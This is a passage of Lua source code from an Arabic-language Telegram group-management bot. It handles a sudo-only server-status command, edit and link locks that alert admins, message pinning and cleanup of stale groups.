Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لم يتم تعيين قناة الاشتراك الاجباري \n⌯︙ارسل ↫ تعيين قناة الاشتراك للتعيين ', 1, 'md')
end end end end
--     Source WAAD     --
if text == 'القناة' or text == 'قناة السورس' or text == 'قناه السورس' or text == 'قنات السورس' then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙Channel ↬ [@CXRCX]', 1, 'md')    
end 
--     Source WAAD     --
if text == 'معلومات السيرفر' or text == 'السيرفر' or text == '↫ السيرفر ⌯' then 
if not Sudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, io.popen([[
LinuxVersion=`lsb_release -ds`
MemoryUsage=`free -m | awk 'NR==2{printf "%s/%sMB {%.2f%%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
Percentage=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
UpTime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}'`
echo '⌯︙نظام التشغيل ↫ ⤈\n`'"$LinuxVersion"'`' 
echo 'ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n⌯︙الذاكره العشوائيه ↫ ⤈\n`'"$MemoryUsage"'`'
echo 'ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n⌯︙وحدة التخزين ↫ ⤈\n`'"$HardDisk"'`'
echo 'ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n⌯︙المعالج ↫ ⤈\n`'"`grep -c processor /proc/cpuinfo`""Core ~ {$Percentage%} "'`'
echo 'ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n⌯︙الدخول ↫ ⤈\n`'`whoami`'`'
echo 'ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n⌯︙مدة تشغيل السيرفر ↫ ⤈\n`'"$UpTime"'`'
]]):read('*a'), 1, 'md')
end
end
--     Source WAAD     --
Shop_WAAD(msg)
--     Source WAAD     --
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.message_id_)},function(extra, result, success)
DevAIAN:incr(WAAD..'AIAN:EditMsg'..result.chat_id_..result.sender_user_id_)
local text = result.content_.text_ or result.content_.caption_
local Text = result.content_.text_
if DevAIAN:get(WAAD..'AIAN:Lock:EditMsgs'..msg.chat_id_) and not Text and not BasicConstructor(result) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
Media = 'الميديا'
if result.content_.ID == "MessagePhoto" then Media = 'الصوره'
elseif result.content_.ID == "MessageSticker" then Media = 'الملصق'
elseif result.content_.ID == "MessageVoice" then Media = 'البصمه'
elseif result.content_.ID == "MessageAudio" then Media = 'الصوت'
elseif result.content_.ID == "MessageVideo" then Media = 'الفيديو'
elseif result.content_.ID == "MessageAnimation" then Media = 'المتحركه'
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,dp) 
local AIANname = '⌯︙العضو ↫ ['..dp.first_name_..'](tg://user?id='..dp.id_..')'
local AIANid = '⌯︙ايديه ↫ `'..dp.id_..'`'
local AIANtext = '⌯︙قام بالتعديل على '..Media
local AIANtxt = 'ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n⌯︙تعالو يامشرفين اكو مخرب'
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,SoOoFi) 
local admins = SoOoFi.members_  
text = '\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n'
for i=0 , #admins do 
if not SoOoFi.members_[i].bot_info_ then
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,data) 
if data.first_name_ ~= false then
text = text.."~ [@"..data.username_.."]\n"
end
if #admins == i then 
SendText(msg.chat_id_, AIANname..'\n'..AIANid..'\n'..AIANtext..text..AIANtxt,0,'md') 
end
end,nil)
end
end
end,nil)
end,nil)
end
if not VipMem(result) then
Filters(result, text)
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") or text:match("#") or text:match("@") or text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match("[Ww][Ww][Ww].") or text:match(".[Xx][Yy][Zz]") then
if DevAIAN:get(WAAD..'AIAN:Lock:EditMsgs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
end end end 
end,nil)
--     Source WAAD     --
elseif (data.ID == "UpdateMessageSendSucceeded") then
local msg = data.message_
local text = msg.content_.text_
local GetMsgPin = DevAIAN:get(WAAD..'AIAN:PinnedMsgs'..msg.chat_id_)
if GetMsgPin ~= nil then
if text == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;DevAIAN:del(WAAD..'AIAN:PinnedMsgs'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if GetMsgPin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevAIAN:del(WAAD..'AIAN:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
if msg.content_.animation_.animation_.persistent_id_ == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevAIAN:del(WAAD..'AIAN:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.photo_) then
if msg.content_.photo_.sizes_[0] then
id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
if id_photo == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevAIAN:del(WAAD..'AIAN:PinnedMsgs'..msg.chat_id_) end,nil)   
end end end
--     Source WAAD     --
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then
print('\27[30;32mجاري تنظيف المجموعات الوهميه يرجى الانتظار\n\27[1;37m')
local PvList = DevAIAN:smembers(WAAD..'AIAN:Users')  
for k,v in pairs(PvList) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
end 
local GpList = DevAIAN:smembers(WAAD..'AIAN:Groups') 
for k,v in pairs(GpList) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
tdcli_function({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=WAAD,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
DevAIAN:srem(WAAD..'AIAN:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevAIAN:srem(WAAD..'AIAN:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
DevAIAN:srem(WAAD..'AIAN:Groups',v)  
end
if data and data.code_ and data.code_ == 400 then
DevAIAN:srem(WAAD..'AIAN:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
DevAIAN:sadd(WAAD..'AIAN:Groups',v)  
end end,nil) end
end
--     Source WAAD     --
end 
------------------------------------------------
-- This Source Was Developed By (AIAN) @VvTVv2.--
--   This Is The Source Channel @CXRCX .     --
--                 - WAAD -                 --
--         -- https://t.me/CXRCX --          --
------------------------------------------------ 
